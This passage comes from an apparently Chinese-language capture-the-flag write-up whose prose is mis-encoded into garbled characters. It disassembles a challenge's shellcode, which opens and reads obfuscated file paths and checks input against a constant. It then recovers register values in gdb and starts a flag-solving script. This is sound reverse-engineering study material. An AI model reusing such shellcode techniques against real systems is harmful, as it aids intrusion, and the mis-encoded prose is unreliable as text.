class="line">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span><br><span class="line">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span><br><span class="line">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span><br><span class="line">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span><br><span class="line">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span><br><span class="line">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span><br></pre></td></tr></table></figure></div></li><li>python è½‰æ›æˆ assembly<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 3: shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br></pre></td></tr></table></figure></div></li><li>Result:<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"> 0:   54                      push   rsp</span><br><span class="line"> 1:   5d                      pop    rbp</span><br><span class="line"> 2:   31 f6                   xor    esi, esi</span><br><span class="line"> 4:   48 b9 a1 57 06 b8 62 3a 9f 37   movabs rcx, 0x379f3a62b80657a1</span><br><span class="line"> e:   48 ba 8e 35 6f d6 4d 49 f7 37   movabs rdx, 0x37f7494dd66f358e</span><br><span class="line">18:   48 31 d1                xor    rcx, rdx</span><br><span class="line">1b:   51                      push   rcx</span><br><span class="line">1c:   54                      push   rsp</span><br><span class="line">1d:   5f                      pop    rdi</span><br><span class="line">1e:   6a 02                   push   0x2</span><br><span class="line">20:   58                      pop    rax</span><br><span class="line">21:   99                      cdq</span><br><span class="line">22:   0f 05                   syscall</span><br><span class="line">24:   48 97                   xchg   rdi, rax</span><br><span class="line">26:   31 c0                   xor    eax, eax</span><br><span class="line">28:   50                      push   rax</span><br><span class="line">29:   54                      push   rsp</span><br><span class="line">2a:   5e                      pop    rsi</span><br><span class="line">2b:   6a 04                   push   0x4</span><br><span class="line">2d:   5a                      pop    rdx</span><br><span class="line">2e:   0f 05                   syscall</span><br><span class="line">30:   41 5c                   pop    r12</span><br><span class="line">32:   6a 03                   push   0x3</span><br><span class="line">34:   58                      pop    rax</span><br><span class="line">35:   0f 05                   syscall</span><br><span class="line">37:   31 f6                   xor    esi, esi</span><br><span class="line">39:   48 b9 3b 3b 6f c3 63 64 c0 aa   movabs rcx, 0xaac06463c36f3b3b</span><br><span class="line">43:   48 ba 48 4c 0b c3 63 64 c0 aa   movabs rdx, 0xaac06463c30b4c48</span><br><span class="line">4d:   48 31 d1                xor    rcx, rdx</span><br><span class="line">50:   51                      push   rcx</span><br><span class="line">51:   48 b9 8c 57 82 75 d6 f8 a9 7d   movabs rcx, 0x7da9f8d67582578c</span><br><span class="line">5b:   48 ba a3 32 f6 16 f9 88 c8 0e   movabs rdx, 0xec888f916f632a3</span><br><span class="line">65:   48 31 d1                xor    rcx, rdx</span><br><span class="line">68:   51                      push   rcx</span><br><span class="line">69:   54                      push   rsp</span><br><span class="line">6a:   5f                      pop    rdi</span><br><span class="line">6b:   6a 02                   push   0x2</span><br><span class="line">6d:   58                      pop    rax</span><br><span class="line">6e:   99                      cdq</span><br><span class="line">6f:   0f 05                   syscall</span><br><span class="line">71:   48 97                   xchg   rdi, rax</span><br><span class="line">73:   31 c0                   xor    eax, eax</span><br><span class="line">75:   50                      push   rax</span><br><span class="line">76:   54                      push   rsp</span><br><span class="line">77:   5e                      pop    rsi</span><br><span class="line">78:   6a 04                   push   0x4</span><br><span class="line">7a:   5a                      pop    rdx</span><br><span class="line">7b:   0f 05                   syscall</span><br><span class="line">7d:   41 5d                   pop    r13</span><br><span class="line">7f:   6a 03                   push   0x3</span><br><span class="line">81:   58                      pop    rax</span><br><span class="line">82:   0f 05                   syscall</span><br><span class="line">84:   31 f6                   xor    esi, esi</span><br><span class="line">86:   6a 6f                   push   0x6f</span><br><span class="line">88:   48 b9 59 e5 06 0c 2d f6 d9 77   movabs rcx, 0x77d9f62d0c06e559</span><br><span class="line">92:   48 ba 76 81 63 7a 02 8c bc 05   movabs rdx, 0x5bc8c027a638176</span><br><span class="line">9c:   48 31 d1                xor    rcx, rdx</span><br><span class="line">9f:   51                      push   rcx</span><br><span class="line">a0:   54                      push   rsp</span><br><span class="line">a1:   5f                      pop    rdi</span><br><span class="line">a2:   6a 02                   push   0x2</span><br><span class="line">a4:   58                      pop    rax</span><br><span class="line">a5:   99                      cdq</span><br><span class="line">a6:   0f 05                   syscall</span><br><span class="line">a8:   48 97                   xchg   rdi, rax</span><br><span class="line">aa:   31 c0                   xor    eax, eax</span><br><span class="line">ac:   50                      push   rax</span><br><span class="line">ad:   54                      push   rsp</span><br><span class="line">ae:   5e                      pop    rsi</span><br><span class="line">af:   6a 04                   push   0x4</span><br><span class="line">b1:   5a                      pop    rdx</span><br><span class="line">b2:   0f 05                   syscall</span><br><span class="line">b4:   58                      pop    rax</span><br><span class="line">b5:   48 f7 d0                not    rax</span><br><span class="line">b8:   48 c1 e8 1d             shr    rax, 0x1d</span><br><span class="line">bc:   48 99                   cqo</span><br><span class="line">be:   6a 29                   push   0x29</span><br><span class="line">c0:   59                      pop    rcx</span><br><span class="line">c1:   48 f7 f1                div    rcx</span><br><span class="line">c4:   49 96                   xchg   r14, rax</span><br><span class="line">c6:   6a 03                   push   0x3</span><br><span class="line">c8:   58                      pop    rax</span><br><span class="line">c9:   0f 05                   syscall</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">d0:   44 01 e0                add    eax, r12d</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br><span class="line">e3:   75 05                   jne    0xea</span><br><span class="line">e5:   6a 01                   push   0x1</span><br><span class="line">e7:   58                      pop    rax</span><br><span class="line">e8:   eb 03                   jmp    0xed</span><br><span class="line">ea:   48 31 c0                xor    rax, rax</span><br><span class="line">ed:   50                      push   rax</span><br><span class="line">ee:   53                      push   rbx</span><br><span class="line">ef:   5f                      pop    rdi</span><br><span class="line">f0:   54                      push   rsp</span><br><span class="line">f1:   5e                      pop    rsi</span><br><span class="line">f2:   6a 08                   push   0x8</span><br><span class="line">f4:   5a                      pop    rdx</span><br><span class="line">f5:   6a 01                   push   0x1</span><br><span class="line">f7:   58                      pop    rax</span><br><span class="line">f8:   0f 05                   syscall</span><br><span class="line">fa:   55                      push   rbp</span><br><span class="line">fb:   5c                      pop    rsp</span><br><span class="line">fc:   41 ff e7                jmp    r15</span><br></pre></td></tr></table></figure></div></li></ul><ol start="4"><li>åˆ†æ shellcode</li></ol><ul><li>0xdeadbeef is not 0xdeadbeef<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br></pre></td></tr></table></figure></div>è§€å¯Ÿ shellcode å¯ä»¥çœ‹åˆ°ç¸½å…±æœ‰å…©å€‹åœ°æ–¹å‡ºç¾äº† 0xdeadbeefï¼Œä½†å…¶å¯¦å¾ ida çœ‹å¾ŒçºŒè¡Œç‚ºå¯ä»¥ç™¼ç¾å®ƒå…¶å¯¦æ˜¯æŠŠç¬¬ä¸€å€‹ 0xdeadbeef æ”¹æˆæˆ‘å€‘è™•ç†éå¾Œçš„ inputï¼Œç„¶å¾Œç¬¬äºŒå€‹æ”¾æˆä¸€å€‹ç‰¹å®šçš„å€¼ã€‚</li><li>ä¸»è¦è¡Œç‚ºï¼š</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># è¨­å®š r12</span><br><span class="line"># è¨­å®š r13</span><br><span class="line"># è¨­å®š r14</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef # æ”¾é€²è™•ç†å¾Œçš„è¼¸å…¥ </span><br><span class="line">d0:   44 01 e0                add    eax, r12d       # å’Œ r12ã€r13ã€r14 åšä¸€äº›é‹ç®—</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d </span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef # æ¯”è¼ƒä¸€å€‹ç‰¹å®šçš„å€¼</span><br></pre></td></tr></table></figure></div><p>ç†è§£å¾Œç›®æ¨™å°±å¾ˆæ˜ç¢ºäº†ï¼Œæˆ‘å€‘åªéœ€è¦æ‰¾å‡ºé‚£ä¸‰å€‹æš«å­˜å™¨çš„å€¼å°±å¯ä»¥æ‹¿åˆ° flag äº†ï¼<br>è‡³æ–¼æ€éº¼æ‰¾å€¼æœ‰å¾ˆå¤šæ–¹å¼ï¼Œåˆ—å‡ºä¸€äº›çµ¦å¤§å®¶åƒè€ƒï¼š</p><ol><li>å¦‚æœå¤ çŒ›ï¼Œå¯ä»¥ç›´æ¥éœæ…‹åˆ†æå‡ºä¾†ï¼Œä½†é€™æœ‰é»ç¡¬ XDï¼Œæ¨è–¦å¾Œé¢å…©ç¨®ã€‚</li><li>å¦å¤–ä¸€ç¨®æ˜¯æ¨¡ä»¿å‰›å‰›ç”¨ä¾†æ¨¡æ“¬ clinet çš„ shellcodeï¼Œå†é…åˆ ida çš„ remote linux debugger å‹•æ…‹åˆ†æã€‚</li><li>ç•¶ç„¶ç›´æ¥ç”¨ gdb åˆ†æä¹Ÿå¯ä»¥ã€‚</li></ol><p>é€™é‚Šé¸æ“‡ç¬¬ä¸‰ç¨®ï¼Œç”¨ gdb ä¾†åˆ†æã€‚å…ˆ <code>break main</code> ä¹‹å¾Œèµ°åˆ° mainï¼Œç„¶å¾Œè¨­å®š <code>watch $r12</code>ã€<code>watch $r13</code>ã€<code>watch $r14</code>å®Œ <code>continue</code>ï¼Œå°±å¯ä»¥ä¾åºçœ‹åˆ°ä¸‰å€‹æš«å­˜å™¨è¢«è¨­å®šï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_r12.png"                      alt="r12"                ></p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r12 = 0x464C457F</span><br><span class="line">r13 = 0x746F6F72</span><br><span class="line">r14 = 0x31F3831F</span><br></pre></td></tr></table></figure></div><p>å¾ ida å–å‡ºè¦æ¯”è¼ƒçš„å¸¸æ•¸ï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_xmm.png"                      alt="xmm"                ></p><p>æŠŠä»–è½‰æˆ uint32 æ–¹ä¾¿å¾…æœƒçš„æ“ä½œï¼š<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_uint32_2.png"                      alt="uint32"                ><br>é©—ç®—ä¸€ä¸‹ä¹Ÿç¢ºå¯¦æ˜¯ 64 bytesã€‚</p><h2 id="0x4-Exploits"><a href="#0x4-Exploits" class="headerlink" title="0x4 Exploits"></a>0x4 Exploits</h2><h3 id="generator-py"><a href="#generator-py" class="headerlink" title="generator.py"></a>generator.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 1: Swap mapping table =====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Improved Swap Mapping Table</span></span><br><span class="line">original_chars = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled_chars = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generating index mapping using list comprehension for efficiency</span></span><br><span class="line">index_mapping = [shuffled_chars.find(char) <span class="keyword">for</span> char <span class="keyword">in</span> original_chars]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Index Mapping: &quot;</span>, index_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 2: Bitwise encryption mapping table =====</span></span><br><span class="line"></span><br><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    